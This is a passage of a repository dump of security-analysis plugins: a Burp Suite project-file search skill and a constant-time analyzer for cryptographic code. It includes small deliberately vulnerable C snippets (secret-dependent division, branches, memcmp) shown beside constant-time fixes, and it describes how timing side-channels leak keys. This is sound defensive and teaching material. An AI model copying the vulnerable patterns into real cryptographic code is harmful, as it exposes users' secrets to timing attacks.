        "plugins/burpsuite-project-parser/.claude-plugin/plugin.json": "{\n  \"name\": \"burpsuite-project-parser\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Search and extract data from Burp Suite project files (.burp) directly from the command line for use in Claude\",\n  \"author\": {\n    \"name\": \"Will Vandevanter\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}",
        "plugins/burpsuite-project-parser/README.md": "# Burp Suite Project Parser\n\nSearch and extract data from Burp Suite project files (.burp) for use in Claude\n\n**Author:** Will Vandevanter\n\n## Prerequisites\n\n- **Burp Suite Professional** - Required for project file support\n- **burpsuite-project-file-parser extension** - Must be installed in Burp Suite (Available: https://github.com/BuffaloWill/burpsuite-project-file-parser)\n- **jq** (optional) - Recommended for formatting/filtering JSON output\n\n## When to Use\n\nUse this skill when you need to get the following from a Burp project:\n- Search response headers or bodies using regex patterns\n- Extract security audit findings and vulnerabilities\n- Dump proxy history or site map data for analysis\n- Programmatically analyze HTTP traffic captured by Burp Suite\n\nTrigger phrases: \"search the burp project\", \"find in burp file\", \"what vulnerabilities in the burp\", \"get audit items from burp\"\n\n## What It Does\n\nThis skill provides CLI access to Burp Suite project files through the burpsuite-project-file-parser extension:\n\n1. **Search headers/bodies** - Find specific patterns in captured HTTP traffic using regex\n2. **Extract audit items** - Get all security findings with severity, confidence, and URLs\n3. **Dump traffic data** - Export proxy history and site map entries as JSON\n4. **Filter output** - Use sub-component filters to optimize performance on large projects\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/burpsuite-project-parser\n```\n\n## Usage\n\nBase command:\n```bash\nscripts/burp-search.sh /path/to/project.burp [FLAGS]\n```\n\n### Available Commands\n\n| Command | Description | Output |\n|---------|-------------|--------|\n| `auditItems` | Extract all security findings | JSON: name, severity, confidence, host, port, protocol, url |\n| `proxyHistory` | Dump all captured HTTP traffic | Complete request/response data |\n| `siteMap` | Dump all site map entries | Site structure |\n| `responseHeader='.*regex.*'` | Search response headers | JSON: url, header |\n| `responseBody='.*regex.*'` | Search response bodies | Matching content |\n\n### Sub-Component Filters\n\nFor large projects, filter to specific data to improve performance:\n\n```bash\nproxyHistory.request.headers    # Only request headers\nproxyHistory.request.body       # Only request body\nproxyHistory.response.headers   # Only response headers\nproxyHistory.response.body      # Only response body\n```\n\nSame patterns work with `siteMap.*`\n\n## Examples\n\nSearch for CORS headers:\n```bash\nscripts/burp-search.sh project.burp \"responseHeader='.*Access-Control.*'\"\n```\n\nGet all high-severity findings:\n```bash\nscripts/burp-search.sh project.burp auditItems | jq 'select(.severity == \"High\")'\n```\n\nFind server signatures:\n```bash\nscripts/burp-search.sh project.burp \"responseHeader='.*(nginx|Apache|Servlet).*'\"\n```\n\nExtract request URLs from proxy history:\n```bash\nscripts/burp-search.sh project.burp proxyHistory.request.headers | jq -r '.request.url'\n```\n\nSearch for HTML forms:\n```bash\nscripts/burp-search.sh project.burp \"responseBody='.*<form.*action.*'\"\n```\n\n## Output Format\n\nAll output is JSON, one object per line. Pipe to `jq` for formatting or use `grep` for filtering:\n\n```bash\nscripts/burp-search.sh project.burp auditItems | jq .\nscripts/burp-search.sh project.burp auditItems | grep -i \"sql injection\"\n```\n\n",
        "plugins/burpsuite-project-parser/commands/burp-search.md": "---\nname: trailofbits:burp-search\ndescription: Searches Burp Suite project files for security analysis\nargument-hint: \"<burp-file> [operation]\"\nallowed-tools:\n  - Bash\n  - Read\n---\n\n# Search Burp Suite Project Files\n\n**Arguments:** $ARGUMENTS\n\nParse arguments:\n1. **Burp file** (required): Path to .burp project file\n2. **Operation** (optional): `auditItems`, `proxyHistory.*`, `responseHeader='...'`, `responseBody='...'`\n\nInvoke the `burpsuite-project-parser` skill with these arguments for the full workflow.\n",
        "plugins/burpsuite-project-parser/skills/SKILL.md": "---\nname: burpsuite-project-parser\ndescription: Searches and explores Burp Suite project files (.burp) from the command line. Use when searching response headers or bodies with regex patterns, extracting security audit findings, dumping proxy history or site map data, or analyzing HTTP traffic captured in a Burp project.\nallowed-tools:\n  - Bash\n  - Read\n---\n\n# Burp Project Parser\n\nSearch and extract data from Burp Suite project files using the burpsuite-project-file-parser extension.\n\n## When to Use\n\n- Searching response headers or bodies with regex patterns\n- Extracting security audit findings from Burp projects\n- Dumping proxy history or site map data\n- Analyzing HTTP traffic captured in a Burp project file\n\n## Prerequisites\n\nThis skill **delegates parsing to Burp Suite Professional** - it does not parse .burp files directly.\n\n**Required:**\n1. **Burp Suite Professional** - Must be installed ([portswigger.net](https://portswigger.net/burp/pro))\n2. **burpsuite-project-file-parser extension** - Provides CLI functionality\n\n**Install the extension:**\n1. Download from [github.com/BuffaloWill/burpsuite-project-file-parser](https://github.com/BuffaloWill/burpsuite-project-file-parser)\n2. In Burp Suite: Extender  Extensions  Add\n3. Select the downloaded JAR file\n\n## Quick Reference\n\nUse the wrapper script:\n```bash\n{baseDir}/scripts/burp-search.sh /path/to/project.burp [FLAGS]\n```\n\nThe script uses environment variables for platform compatibility:\n- `BURP_JAVA`: Path to Java executable\n- `BURP_JAR`: Path to burpsuite_pro.jar\n\nSee [Platform Configuration](#platform-configuration) for setup instructions.\n\n## Sub-Component Filters (USE THESE)\n\n**ALWAYS use sub-component filters instead of full dumps.** Full `proxyHistory` or `siteMap` can return gigabytes of data. Sub-component filters return only what you need.\n\n### Available Filters\n\n| Filter | Returns | Typical Size |\n|--------|---------|--------------|\n| `proxyHistory.request.headers` | Request line + headers only | Small (< 1KB/record) |\n| `proxyHistory.request.body` | Request body only | Variable |\n| `proxyHistory.response.headers` | Status + headers only | Small (< 1KB/record) |\n| `proxyHistory.response.body` | Response body only | **LARGE - avoid** |\n| `siteMap.request.headers` | Same as above for site map | Small |\n| `siteMap.request.body` | | Variable |\n| `siteMap.response.headers` | | Small |\n| `siteMap.response.body` | | **LARGE - avoid** |\n\n### Default Approach\n\n**Start with headers, not bodies:**\n\n```bash\n# GOOD - headers only, safe to retrieve\n{baseDir}/scripts/burp-search.sh project.burp proxyHistory.request.headers | head -c 50000\n{baseDir}/scripts/burp-search.sh project.burp proxyHistory.response.headers | head -c 50000\n\n# BAD - full records include bodies, can be gigabytes\n{baseDir}/scripts/burp-search.sh project.burp proxyHistory  # NEVER DO THIS\n```\n\n**Only fetch bodies for specific URLs after reviewing headers, and ALWAYS truncate:**\n\n```bash\n# 1. First, find interesting URLs from headers\n{baseDir}/scripts/burp-search.sh project.burp proxyHistory.response.headers | \\\n  jq -r 'select(.headers | test(\"text/html\")) | .url' | head -n 20\n\n# 2. Then search bodies with targeted regex - MUST truncate body to 1000 chars\n{baseDir}/scripts/burp-search.sh project.burp \"responseBody='.*specific-pattern.*'\" | \\\n  head -n 10 | jq -c '.body = (.body[:1000] + \"...[TRUNCATED]\")'\n```\n\n**HARD RULE: Body content > 1000 chars must NEVER enter context.** If the user needs full body content, they must view it in Burp Suite's UI.\n\n## Regex Search Operations\n\n### Search Response Headers\n```bash\nresponseHeader='.*regex.*'\n```\nSearches all response headers. Output: `{\"url\":\"...\", \"header\":\"...\"}`\n\nExample - find server signatures:\n```bash\nresponseHeader='.*(nginx|Apache|Servlet).*' | head -c 50000\n```\n\n### Search Response Bodies\n```bash\nresponseBody='.*regex.*'\n```\n**MANDATORY: Always truncate body content to 1000 chars max.** Response bodies can be megabytes each.\n\n```bash\n# REQUIRED format - always truncate .body field\n{baseDir}/scripts/burp-search.sh project.burp \"responseBody='.*<form.*action.*'\" | \\\n  head -n 10 | jq -c '.body = (.body[:1000] + \"...[TRUNCATED]\")'\n```\n\n**Never retrieve full body content.** If you need to see more of a specific response, ask the user to open it in Burp Suite's UI.\n\n## Other Operations\n\n### Extract Audit Items\n```bash\nauditItems\n```\nReturns all security findings. Output includes: name, severity, confidence, host, port, protocol, url.\n\n**Note:** Audit items are small (no bodies) - safe to retrieve with `head -n 100`.\n\n### Dump Proxy History (AVOID)\n```bash\nproxyHistory\n```\n**NEVER use this directly.** Use sub-component filters instead:\n- `proxyHistory.request.headers`\n- `proxyHistory.response.headers`\n\n### Dump Site Map (AVOID)\n```bash\nsiteMap\n```\n**NEVER use this directly.** Use sub-component filters instead.\n\n## Output Limits (REQUIRED)\n\n**CRITICAL: Always check result size BEFORE retrieving data.** A broad search can return thousands of records, each potentially megabytes. This will overflow the context window.\n\n### Step 1: Always Check Size First\n\nBefore any search, check BOTH record count AND byte size:\n\n```bash\n# Check record count AND total bytes - never skip this step\n{baseDir}/scripts/burp-search.sh project.burp proxyHistory | wc -cl\n{baseDir}/scripts/burp-search.sh project.burp \"responseHeader='.*Server.*'\" | wc -cl\n{baseDir}/scripts/burp-search.sh project.burp auditItems | wc -cl\n```\n\nThe `wc -cl` output shows: `<bytes> <lines>` (e.g., `524288 42` means 512KB across 42 records).\n\n**Interpret the results - BOTH must pass:**\n\n| Metric | Safe | Narrow search | Too broad | STOP |\n|--------|------|---------------|-----------|------|\n| **Lines** | < 50 | 50-200 | 200+ | 1000+ |\n| **Bytes** | < 50KB | 50-200KB | 200KB+ | 1MB+ |\n\n**A single 10MB response on one line will show high byte count but only 1 line - the byte check catches this.**\n\n### Step 2: Refine Broad Searches\n\nIf count/size is too high:\n\n1. **Use sub-component filters** (see table above):\n   ```bash\n   # Instead of: proxyHistory (gigabytes)\n   # Use: proxyHistory.request.headers (kilobytes)\n   ```\n\n2. **Narrow regex patterns:**\n   ```bash\n   # Too broad (matches everything):\n   responseHeader='.*'\n\n   # Better - target specific headers:\n   responseHeader='.*X-Frame-Options.*'\n   responseHeader='.*Content-Security-Policy.*'\n   ```\n\n3. **Filter with jq before retrieving:**\n   ```bash\n   # Get only specific content types\n   {baseDir}/scripts/burp-search.sh project.burp proxyHistory.response.headers | \\\n     jq -c 'select(.url | test(\"/api/\"))' | head -n 50\n   ```\n\n### Step 3: Always Truncate Output\n\nEven after narrowing, always pipe through truncation:\n\n```bash\n# ALWAYS use head -c to limit total bytes (max 50KB)\n{baseDir}/scripts/burp-search.sh project.burp proxyHistory.request.headers | head -c 50000\n\n# For body searches, truncate each JSON object's body field:\n{baseDir}/scripts/burp-search.sh project.burp \"responseBody='pattern'\" | \\\n  head -n 20 | jq -c '.body = (.body | if length > 1000 then .[:1000] + \"...[TRUNCATED]\" else . end)'\n\n# Limit both record count AND byte size:\n{baseDir}/scripts/burp-search.sh project.burp auditItems | head -n 50 | head -c 50000\n```\n\n**Hard limits to enforce:**\n- `head -c 50000` (50KB max) on ALL output\n- **Truncate `.body` fields to 1000 chars - MANDATORY, no exceptions**\n  ```bash\n  jq -c '.body = (.body[:1000] + \"...[TRUNCATED]\")'\n  ```\n\n**Never run these without counting first AND truncating:**\n- `proxyHistory` / `siteMap` (full dumps - always use sub-component filters)\n- `responseBody='...'` searches (bodies can be megabytes each)\n- Any broad regex like `.*` or `.+`\n\n## Investigation Workflow\n\n1. **Identify scope** - What are you looking for? (specific vuln type, endpoint, header pattern)\n\n2. **Search audit items first** - Start with Burp's findings:\n   ```bash\n   {baseDir}/scripts/burp-search.sh project.burp auditItems | jq 'select(.severity == \"High\")'\n   ```\n\n3. **Check confidence scores** - Filter for actionable findings:\n   ```bash\n   ... | jq 'select(.confidence == \"Certain\" or .confidence == \"Firm\")'\n   ```\n\n4. **Extract affected URLs** - Get the attack surface:\n   ```bash\n   ... | jq -r '.url' | sort -u\n   ```\n\n5. **Search raw traffic for context** - Examine actual requests/responses:\n   ```bash\n   {baseDir}/scripts/burp-search.sh project.burp \"responseBody='pattern'\"\n   ```\n\n6. **Validate manually** - Burp findings are indicators, not proof. Verify each one.\n\n## Understanding Results\n\n### Severity vs Confidence\n\nBurp reports both **severity** (High/Medium/Low) and **confidence** (Certain/Firm/Tentative). Use both when triaging:\n\n| Combination | Meaning |\n|-------------|---------|\n| High + Certain | Likely real vulnerability, prioritize investigation |\n| High + Tentative | Often a false positive, verify before reporting |\n| Medium + Firm | Worth investigating, may need manual validation |\n\nA \"High severity, Tentative confidence\" finding is frequently a false positive. Don't report findings based on severity alone.\n\n### When Proxy History is Incomplete\n\nProxy history only contains what Burp captured. It may be missing traffic due to:\n- **Scope filters** excluding domains\n- **Intercept settings** dropping requests\n- **Browser traffic** not routed through Burp proxy\n\nIf you don't find expected traffic, check Burp's scope and proxy settings in the original project.\n\n### HTTP Body Encoding\n\nResponse bodies may be gzip compressed, chunked, or use non-UTF8 encoding. Regex patterns that work on plaintext may silently fail on encoded responses. If searches return fewer results than expected:\n- Check if responses are compressed\n- Try broader patterns or search headers first\n- Use Burp's UI to inspect raw vs rendered response\n\n## Rationalizations to Reject\n\nCommon shortcuts that lead to missed vulnerabilities or false reports:\n\n| Shortcut | Why It's Wrong |\n|----------|----------------|\n| \"This regex looks good\" | Verify on sample data firstencoding and escaping cause silent failures |\n| \"High severity = must fix\" | Check confidence score too; Burp has false positives |\n| \"All audit items are relevant\" | Filter by actual threat model; not every finding matters for every app |\n| \"Proxy history is complete\" | May be filtered by Burp scope/intercept settings; you see only what Burp captured |\n| \"Burp found it, so it's a vuln\" | Burp findings require manual verificationthey indicate potential issues, not proof |\n\n## Output Format\n\nAll output is JSON, one object per line. Pipe to `jq` for formatting:\n```bash\n{baseDir}/scripts/burp-search.sh project.burp auditItems | jq .\n```\n\nFilter with grep:\n```bash\n{baseDir}/scripts/burp-search.sh project.burp auditItems | grep -i \"sql injection\"\n```\n\n## Examples\n\nSearch for CORS headers (with byte limit):\n```bash\n{baseDir}/scripts/burp-search.sh project.burp \"responseHeader='.*Access-Control.*'\" | head -c 50000\n```\n\nGet all high-severity findings (audit items are small, but still limit):\n```bash\n{baseDir}/scripts/burp-search.sh project.burp auditItems | jq -c 'select(.severity == \"High\")' | head -n 100\n```\n\nExtract just request URLs from proxy history:\n```bash\n{baseDir}/scripts/burp-search.sh project.burp proxyHistory.request.headers | jq -r '.request.url' | head -n 200\n```\n\nSearch response bodies (MUST truncate body to 1000 chars):\n```bash\n{baseDir}/scripts/burp-search.sh project.burp \"responseBody='.*password.*'\" | \\\n  head -n 10 | jq -c '.body = (.body[:1000] + \"...[TRUNCATED]\")'\n```\n\n## Platform Configuration\n\nThe wrapper script requires two environment variables to locate Burp Suite's bundled Java and JAR file.\n\n### macOS\n\n```bash\nexport BURP_JAVA=\"/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java\"\nexport BURP_JAR=\"/Applications/Burp Suite Professional.app/Contents/Resources/app/burpsuite_pro.jar\"\n```\n\n### Windows\n\n```powershell\n$env:BURP_JAVA = \"C:\\Program Files\\BurpSuiteProfessional\\jre\\bin\\java.exe\"\n$env:BURP_JAR = \"C:\\Program Files\\BurpSuiteProfessional\\burpsuite_pro.jar\"\n```\n\n### Linux\n\n```bash\nexport BURP_JAVA=\"/opt/BurpSuiteProfessional/jre/bin/java\"\nexport BURP_JAR=\"/opt/BurpSuiteProfessional/burpsuite_pro.jar\"\n```\n\nAdd these exports to your shell profile (`.bashrc`, `.zshrc`, etc.) for persistence.\n\n### Manual Invocation\n\nIf not using the wrapper script, invoke directly:\n```bash\n\"$BURP_JAVA\" -jar -Djava.awt.headless=true \"$BURP_JAR\" \\\n  --project-file=/path/to/project.burp [FLAGS]\n```\n",
        "plugins/constant-time-analysis/.claude-plugin/plugin.json": "{\n  \"name\": \"constant-time-analysis\",\n  \"version\": \"0.1.0\",\n  \"description\": \"Detect compiler-induced timing side-channels in cryptographic code\",\n  \"author\": {\n    \"name\": \"Scott Arciszewski\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/constant-time-analysis/README.md": "# Constant-Time Analyzer (ct-analyzer)\n\nA portable tool for detecting timing side-channel vulnerabilities in compiled cryptographic code. Analyzes assembly output from multiple compilers and architectures to detect instructions that could leak secret data through execution timing.\n\n## Background\n\nTiming side-channel attacks exploit variations in execution time to extract secret information from cryptographic implementations. Common sources include:\n\n- **Hardware division** (`DIV`, `IDIV`): Execution time varies based on operand values\n- **Floating-point operations** (`FDIV`, `FSQRT`): Variable latency based on inputs\n- **Conditional branches**: Different execution paths have different timing\n\nThe infamous [KyberSlash](https://kyberslash.cr.yp.to/) attack demonstrated how division instructions in post-quantum cryptographic implementations could be exploited to recover secret keys.\n\n## Features\n\n- **Multi-language support**: C, C++, Go, Rust, PHP, JavaScript, TypeScript, Python, Ruby\n- **Multi-architecture support**: x86_64, ARM64, ARM, RISC-V, PowerPC, s390x, i386\n- **Multi-compiler support**: GCC, Clang, Go compiler, Rustc\n- **Scripting language support**: PHP (VLD/opcache), JavaScript/TypeScript (V8 bytecode), Python (dis), Ruby (YARV)\n- **Optimization-level testing**: Test across O0-O3, Os, Oz\n- **Multiple output formats**: Text, JSON, GitHub Actions annotations\n- **Cross-compilation**: Analyze code for different target architectures\n\n## Quick Start\n\n```bash\n# Install\nuv pip install -e .\n\n# Analyze a C file\nct-analyzer crypto.c\n```\n\n## Usage\n\n### Basic Analysis\n\n```bash\nct-analyzer <source_file>\n```\n\n### Options\n\n| Option | Description |\n|--------|-------------|\n| `--arch, -a` | Target architecture (x86_64, arm64, arm, riscv64, ppc64le, s390x, i386) |\n| `--compiler, -c` | Compiler to use (gcc, clang, go, rustc) |\n| `--opt-level, -O` | Optimization level (O0, O1, O2, O3, Os, Oz) - default: O2 |\n| `--warnings, -w` | Include conditional branch warnings |\n| `--func, -f` | Regex pattern to filter functions |\n| `--json` | Output JSON format |\n| `--github` | Output GitHub Actions annotations |\n| `--list-arch` | List supported architectures |\n\n### Examples\n\n```bash\n# Test with different optimization levels\nct-analyzer --opt-level O0 crypto.c\nct-analyzer --opt-level O3 crypto.c\n\n# Cross-compile for ARM64\nct-analyzer --arch arm64 crypto.c\n\n# Include conditional branch warnings\nct-analyzer --warnings crypto.c\n\n# Analyze specific functions\nct-analyzer --func 'decompose|sign' crypto.c\n\n# JSON output for CI\nct-analyzer --json crypto.c\n\n# Analyze Go code\nct-analyzer crypto.go\n\n# Analyze Rust code\nct-analyzer crypto.rs\n\n# Analyze PHP code (requires PHP with VLD extension or opcache)\nct-analyzer crypto.php\n\n# Analyze TypeScript (transpiles to JS first)\nct-analyzer crypto.ts\n\n# Analyze JavaScript (uses V8 bytecode analysis)\nct-analyzer crypto.js\n\n# Analyze Python (uses dis module for bytecode disassembly)\nct-analyzer crypto.py\n\n# Analyze Ruby (uses YARV instruction dump)\nct-analyzer crypto.rb\n```\n\n## Detected Vulnerabilities\n\n### Error-Level (Must Fix)\n\n| Category | x86_64 | ARM64 | RISC-V |\n|----------|--------|-------|--------|\n| Integer Division | DIV, IDIV, DIVQ, IDIVQ | UDIV, SDIV | DIV, DIVU, REM, REMU |\n| FP Division | DIVSS, DIVSD, DIVPS, DIVPD | FDIV | FDIV.S, FDIV.D |\n| Square Root | SQRTSS, SQRTSD, SQRTPS, SQRTPD | FSQRT | FSQRT.S, FSQRT.D |\n\n### Warning-Level (Review Needed)\n\nConditional branches that may leak timing if condition depends on secret data:\n\n- x86: JE, JNE, JZ, JNZ, JA, JB, JG, JL, etc.\n- ARM: BEQ, BNE, CBZ, CBNZ, TBZ, TBNZ\n- RISC-V: BEQ, BNE, BLT, BGE\n\n## Scripting Language Support\n\n### PHP Analysis\n\nPHP analysis uses either the VLD extension (recommended) or opcache debug output:\n\n**Detected PHP Vulnerabilities:**\n\n| Category | Pattern | Recommendation |\n|----------|---------|----------------|\n| Division | `ZEND_DIV`, `ZEND_MOD` | Use Barrett reduction |\n| Cache timing | `chr()`, `ord()` | Use `pack('C', $int)` / `unpack('C', $char)[1]` |\n| Table lookups | `bin2hex()`, `hex2bin()`, `base64_encode()` | Use constant-time alternatives |\n| Array access | `FETCH_DIM_R` (secret index) | Use constant-time table lookup |\n| Bit shifts | `ZEND_SL`, `ZEND_SR` (secret amount) | Mask shift amount |\n| Variable encoding | `pack()`, `serialize()`, `json_encode()` | Use fixed-length output |\n| Weak RNG | `rand()`, `mt_rand()`, `uniqid()` | Use `random_int()` / `random_bytes()` |\n| String comparison | `strcmp()`, `===` on secrets | Use `hash_equals()` |\n\n**Installation:**\n\n```bash\n# Install VLD extension (recommended)\n# Query latest version from PECL\nVLD_VERSION=$(curl -s https://pecl.php.net/package/vld | grep -oP 'vld-\\K[0-9.]+(?=\\.tgz)' | head -1)\npecl install channel://pecl.php.net/vld-${VLD_VERSION}\n\n# Or build from source (if PECL fails)\ngit clone https://github.com/derickr/vld.git && cd vld\nphpize && ./configure && make && sudo make install\n\n# Or use opcache (built-in, fallback)\n# Enabled by default in PHP 7+\n```\n\n### JavaScript/TypeScript Analysis\n\nJavaScript analysis uses V8 bytecode via Node.js `--print-bytecode`. TypeScript files are automatically transpiled first.\n\n**Detected JS Vulnerabilities:**\n\n| Category | Pattern | Recommendation |\n|----------|---------|----------------|\n| Division | `Div`, `Mod` bytecodes | Use constant-time multiply-shift |\n| Array access | `LdaKeyedProperty` (secret index) | Use constant-time table lookup |\n| Bit shifts | `ShiftLeft`, `ShiftRight` (secret amount) | Mask shift amount |\n| Variable encoding | `TextEncoder`, `JSON.stringify()`, `btoa()` | Use fixed-length output |\n| Weak RNG | `Math.random()` | Use `crypto.getRandomValues()` or `crypto.randomBytes()` |\n| Variable latency | `Math.sqrt()`, `Math.pow()` | Avoid in crypto paths |\n| String comparison | `===` on secrets | Use `crypto.timingSafeEqual()` (Node.js) |\n| Early-exit search | `indexOf()`, `includes()` | Use constant-time comparison |\n\n**Requirements:**\n```bash\n# Node.js required\nnode --version\n\n# TypeScript compiler (optional, for .ts files)\nnpm install -g typescript\n```\n\n### Python Analysis\n\nPython analysis uses the built-in `dis` module to analyze CPython bytecode.\n\n**Detected Python Vulnerabilities:**\n\n| Category | Pattern | Recommendation |\n|----------|---------|----------------|\n| Division | `BINARY_OP 11 (/)`, `BINARY_OP 6 (%)` | Use Barrett reduction or constant-time alternatives |\n| Array access | `BINARY_SUBSCR` (secret index) | Use constant-time table lookup |\n| Bit shifts | `BINARY_LSHIFT`, `BINARY_RSHIFT` (secret amount) | Mask shift amount |\n| Variable encoding | `int.to_bytes()`, `json.dumps()`, `base64.b64encode()` | Use fixed-length output |\n| Weak RNG | `random.random()`, `random.randint()` | Use `secrets.token_bytes()` / `secrets.randbelow()` |\n| Variable latency | `math.sqrt()`, `math.pow()` | Avoid in crypto paths |\n| String comparison | `==` on secrets | Use `hmac.compare_digest()` |\n| Early-exit search | `.find()`, `.startswith()` | Use constant-time comparison |\n\n**Requirements:**\n```bash\n# Python 3.x required (built-in dis module)\npython3 --version\n```\n\n### Ruby Analysis\n\nRuby analysis uses YARV (Yet Another Ruby VM) bytecode via `ruby --dump=insns`.\n\n**Detected Ruby Vulnerabilities:**\n\n| Category | Pattern | Recommendation |\n|----------|---------|----------------|\n| Division | `opt_div`, `opt_mod` | Use constant-time alternatives |\n| Array access | `opt_aref` (secret index) | Use constant-time table lookup |\n| Bit shifts | `opt_lshift`, `opt_rshift` (secret amount) | Mask shift amount |\n| Variable encoding | `pack()`, `to_json()`, `Base64.encode64()` | Use fixed-length output |\n| Weak RNG | `rand()`, `Random.new` | Use `SecureRandom.random_bytes()` |\n| Variable latency | `Math.sqrt()` | Avoid in crypto paths |\n| String comparison | `==` on secrets | Use `Rack::Utils.secure_compare()` or OpenSSL |\n| Early-exit search | `.include?()`, `.start_with?()` | Use constant-time comparison |\n\n**Requirements:**\n```bash\n# Ruby required (YARV is standard since Ruby 1.9)\nruby --version\n```\n\n## Example Output\n\n```text\n============================================================\nConstant-Time Analysis Report\n============================================================\nSource: decompose.c\nArchitecture: arm64\nCompiler: clang\nOptimization: O2\nFunctions analyzed: 4\nInstructions analyzed: 88\n\nVIOLATIONS FOUND:\n----------------------------------------\n[ERROR] SDIV\n  Function: decompose_vulnerable\n  Reason: SDIV has early termination optimization; execution time depends on operand values\n\n[ERROR] SDIV\n  Function: use_hint_vulnerable\n  Reason: SDIV has early termination optimization; execution time depends on operand values\n\n----------------------------------------\nResult: FAILED\nErrors: 2, Warnings: 0\n```\n\n## Fixing Violations\n\n### Replace Division with Barrett Reduction\n\n```c\n// VULNERABLE\nint32_t q = a / divisor;\n\n// SAFE: Barrett reduction\n// Precompute: mu = ceil(2^32 / divisor)\nuint32_t q = (uint32_t)(((uint64_t)a * mu) >> 32);\n```\n\n### Replace Branches with Constant-Time Selection\n\n```c\n// VULNERABLE\nif (secret) {\n    result = a;\n} else {\n    result = b;\n}\n\n// SAFE: Constant-time selection\nuint32_t mask = -(uint32_t)(secret != 0);\nresult = (a & mask) | (b & ~mask);\n```\n\n### Replace Comparisons\n\n```c\n// VULNERABLE\nif (memcmp(a, b, len) == 0) { ... }\n\n// SAFE: Use crypto/subtle or equivalent\nif (subtle.ConstantTimeCompare(a, b) == 1) { ... }\n```\n\n## Test Samples\n\nThe repository includes test samples demonstrating vulnerable and secure implementations:\n\n- `ct_analyzer/tests/test_samples/decompose_vulnerable.c` - Vulnerable C implementation\n- `ct_analyzer/tests/test_samples/decompose_constant_time.c` - Constant-time C implementation\n- `ct_analyzer/tests/test_samples/decompose_vulnerable.go` - Vulnerable Go implementation\n- `ct_analyzer/tests/test_samples/decompose_vulnerable.rs` - Vulnerable Rust implementation\n- `ct_analyzer/tests/test_samples/vulnerable.php` - Vulnerable PHP implementation\n- `ct_analyzer/tests/test_samples/vulnerable.ts` - Vulnerable TypeScript implementation\n- `ct_analyzer/tests/test_samples/vulnerable.py` - Vulnerable Python implementation\n- `ct_analyzer/tests/test_samples/vulnerable.rb` - Vulnerable Ruby implementation\n\nThese implement the Decompose and UseHint algorithms from ML-DSA (FIPS-204) as test cases.\n\n## CI Integration\n\n### GitHub Actions\n\n```yaml\nname: Constant-Time Check\n\non: [push, pull_request]\n\njobs:\n  ct-check:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: '3.11'\n\n      - name: Install dependencies\n        run: |\n          uv pip install -e .\n\n      - name: Check constant-time properties\n        run: |\n          ct-analyzer --github src/crypto/*.c\n```\n\n### GitLab CI\n\n```yaml\nct-check:\n  stage: test\n  script:\n    - uv pip install -e .\n    - ct-analyzer --json src/crypto/*.c > ct-report.json\n  artifacts:\n    reports:\n      codequality: ct-report.json\n```\n\n## Limitations\n\n1. **Compiler Output Analysis**: Analyzes what the compiler produces, not runtime behavior. Cannot detect:\n   - Cache timing attacks from memory access patterns\n   - Microarchitectural side-channels (Spectre, etc.)\n   - Processor-specific optimizations\n\n2. **No Data Flow Analysis**: Flags all dangerous instructions regardless of whether they operate on secret data. Manual review is needed to determine if flagged code handles secrets. **This means false positives are expected** - for example, division used in loop bounds with public constants will be flagged even though it's not a vulnerability.\n\n3. **False Positive Verification**: For each flagged violation, verify the operands:\n   - If operands are compile-time constants or public parameters  likely false positive\n   - If operands are derived from keys, plaintext, or secrets  true positive\n   - See the SKILL.md documentation for detailed triage guidance\n\n4. **Compiler Variations**: Different compilers/versions may produce different assembly. Test with:\n   - Multiple optimization levels\n   - Multiple compilers\n   - Target production architectures\n\n5. **Scripting Languages**: PHP, JavaScript/TypeScript, Python, and Ruby are supported via bytecode analysis.\n\n## Running Tests\n\n```bash\npython3 ct_analyzer/tests/test_analyzer.py\n```\n\n## References\n\n- [Cryptocoding Guidelines](https://github.com/veorq/cryptocoding)\n- [KyberSlash Attack](https://kyberslash.cr.yp.to/)\n- [NIST FIPS 204: ML-DSA](https://csrc.nist.gov/pubs/fips/204/final)\n- [Trail of Bits ML-DSA Implementation](https://github.com/trailofbits/ml-dsa)\n\n## Acknowledgments\n\nBased on the [test_ct utility](https://github.com/trailofbits/ml-dsa/pull/16) created for ML-DSA.\n",
        "plugins/constant-time-analysis/commands/ct-check.md": "---\nname: trailofbits:ct-check\ndescription: Detects timing side-channels in cryptographic code\nargument-hint: \"<source-file> [--warnings] [--json] [--arch <arch>]\"\nallowed-tools:\n  - Bash\n  - Read\n  - Grep\n  - Glob\n---\n\n# Check Constant-Time Properties\n\n**Arguments:** $ARGUMENTS\n\nParse arguments:\n1. **Source file** (required): Path to source file to analyze\n2. **Flags** (optional): `--warnings`, `--json`, `--arch <arch>`, `--opt-level <level>`, `--func <pattern>`\n\nInvoke the `constant-time-analysis` skill with these arguments for the full workflow.\n",
        "plugins/constant-time-analysis/skills/constant-time-analysis/README.md": "# Constant-Time Analysis Skill\n\nA Claude Code skill that detects timing side-channel vulnerabilities in cryptographic code by analyzing assembly or bytecode output for dangerous instructions.\n\n## What This Skill Does\n\nWhen activated, this skill helps Claude:\n\n- **Detect timing vulnerabilities** - Identifies variable-time instructions (division, floating-point) that leak secrets through execution timing\n- **Analyze across architectures** - Tests compiled output for x86_64, ARM64, RISC-V, and other targets\n- **Support scripting languages** - Analyzes PHP, JavaScript/TypeScript, Python, and Ruby via bytecode\n- **Guide constant-time fixes** - Provides patterns for Barrett reduction, constant-time selection, and safe comparisons\n- **Integrate with CI** - Produces JSON output suitable for automated pipelines\n\n## Supported Languages\n\n| Language | Analysis Method | Reference Guide |\n|----------|-----------------|-----------------|\n| C/C++ | Assembly (gcc/clang) | [references/compiled.md](references/compiled.md) |\n| Go | Assembly (go) | [references/compiled.md](references/compiled.md) |\n| Rust | Assembly (rustc) | [references/compiled.md](references/compiled.md) |\n| PHP | Zend opcodes (VLD/OPcache) | [references/php.md](references/php.md) |\n| JavaScript | V8 bytecode (Node.js) | [references/javascript.md](references/javascript.md) |\n| TypeScript | V8 bytecode (tsc + Node.js) | [references/javascript.md](references/javascript.md) |\n| Python | CPython bytecode (dis) | [references/python.md](references/python.md) |\n| Ruby | YARV bytecode | [references/ruby.md](references/ruby.md) |\n\n## Supported Architectures (Compiled Languages)\n\n| Architecture | Division Instructions | Common Use 